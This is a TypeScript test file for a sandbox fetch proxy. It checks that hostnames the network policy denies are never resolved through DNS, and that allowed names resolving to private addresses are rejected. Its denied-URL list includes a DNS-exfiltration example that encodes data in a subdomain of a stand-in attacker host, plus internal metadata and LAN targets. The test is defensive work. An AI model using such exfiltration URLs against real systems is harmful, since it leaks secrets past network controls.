// Sim fetch proxy: the policy decides everything it can before DNS, so denied names never leave the Mac as
// lookups (review 1, #3).

import assert from "node:assert/strict";
import { test } from "node:test";
import type { NetworkMode } from "@terrarium/shared";
import { NetDenied, proxyFetch } from "./net-proxy.ts";
import { policy } from "./policy.ts";
import type { NetAttempt } from "./types.ts";

test("names the policy denies are never resolved", async () => {
  const looked: string[] = [];
  const lookup = async (h: string) => {
    looked.push(h);
    return ["93.184.215.14"];
  };
  const attempts: NetAttempt[] = [];
  const denied: [NetworkMode, string, string?][] = [
    ["registries", "https://c2VjcmV0LWRhdGE.attacker.example/"], // exfiltration through the query name
    ["registries", "http://printer.local/"], // would be an mDNS query on the LAN
    ["web", "http://printer.local/"],
    ["web", "http://metadata.internal/"],
    ["off", "https://example.com/"],
    ["registries", "https://pypi.org:8443/simple/"],
    ["registries", "https://pypi.org/simple/", "POST"],
  ];
  for (const [mode, url, method] of denied) {
    await assert.rejects(
      proxyFetch(() => mode, policy, { url, method }, (a) => attempts.push(a), lookup),
      (err: unknown) => err instanceof NetDenied,
      `${mode} ${url}`,
    );
  }
  assert.deepEqual(looked, [], "no DNS query for a denied name");
  assert.equal(attempts.length, denied.length);
  assert.ok(attempts.every((a) => a.decision === "deny"));

  // An allowed name is resolved once and checked again with its addresses.
  await assert.rejects(
    proxyFetch(() => "registries", policy, { url: "https://pypi.org/simple/" }, (a) => attempts.push(a), async (h) => (looked.push(h), ["10.0.0.5"])),
    /non-public|resolves to/,
  );
  assert.deepEqual(looked, ["pypi.org"]);
});
